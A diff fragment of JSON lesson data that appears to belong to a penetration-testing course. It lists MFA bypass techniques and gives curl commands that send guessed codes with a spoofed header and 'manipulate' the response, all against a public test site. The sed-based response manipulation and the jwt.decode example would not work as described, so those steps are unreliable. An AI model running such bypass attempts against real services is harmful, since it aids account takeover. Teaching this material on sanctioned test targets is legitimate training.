+              },
+              {
+                "description": "JWT Tool Install",
+                "command": "pip3 install pyjwt && python3 -c \"import jwt; print(jwt.decode('token', verify=False))\"",
+                "explanation": "JWT manipulation tool install aur use karta hai"
+              }
+            ]
+          },
+          {
+            "heading": "Multi-Factor Authentication Bypass",
+            "text": "MFA Bypass Techniques:\n\n• Response manipulation\n• Status code modification\n• Race conditions\n• Backup codes brute force\n• Social engineering\n• SIM swapping\n• SS7 attacks\n• Push notification fatigue\n\nCommon MFA Flaws:\n• MFA not enforced everywhere\n• Weak backup methods\n• Predictable backup codes\n• MFA reset vulnerabilities\n• Implementation flaws",
+            "commands": [
+              {
+                "description": "MFA Bypass Test",
+                "command": "curl -X POST http://testphp.vulnweb.com/verify-mfa.php -d 'code=000000' -H 'X-Forwarded-For: 127.0.0.1'",
+                "explanation": "MFA bypass attempt with IP spoofing"
+              },
+              {
+                "description": "Response Manipulation",
+                "command": "curl -X POST http://testphp.vulnweb.com/verify-mfa.php -d 'code=123456' | sed 's/false/true/g'",
+                "explanation": "Response manipulation attempt"
+              }
+            ]
+          }
+        ]
+      }
+    }
+  ]
+}
